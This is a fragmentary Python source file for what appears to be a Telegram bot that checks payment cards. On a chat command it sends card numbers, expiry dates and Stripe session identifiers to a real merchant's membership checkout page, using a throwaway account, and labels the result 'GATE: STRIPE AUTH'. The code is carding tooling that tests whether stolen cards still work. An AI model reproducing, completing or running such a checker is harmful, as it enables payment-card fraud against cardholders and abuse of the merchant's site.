...
@Client.on_message(filters.command(["so"], prefixes=[".", "/", "!"], case_sensitive=False) & filters.text)
...
'card[exp_month]': mes,
'card[exp_year]': ano,
'guid':'813f113d-ccb7-4c8a-9641-a747e8820d01f9f98c',
'muid':'fd7bc752-3870-425d-b051-c0e0b6cd1833767d32',
'sid':'039850f4-f128-4f5a-addb-1f35757167a608088f',
...
'_stripe_account':'acct_1HkAf3IZbVvqaZXp',
                                }
...
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                    ...
                                    "origin": "https://splootmarketing.com",
                                    "referer": "https://splootmarketing.com/membership-account/membership-checkout/",
                                    "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36",
                                    }

                                    data = f"level=5&checkjavascript=1&other_discount_code=&username={get_username()}&password={password}&password2={password}&bemail={email}&bconfirmemail={email}&fullname=&CardType={vendor}&discount_code=&submit-checkout=1&javascriptok=1&payment_method_id={id}&AccountNumber={cc}&ExpirationMonth={mes}&ExpirationYear={ano}"
                                    res = curl.post("https://splootmarketing.com/membership-account/membership-checkout/",headers=headers,data=data)
                                    text = f"""
<b>〄</b> GATE: <b>STRIPE AUTH [8]</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> PROCESS: <b>■■■■■■■■■■ 100%</b>
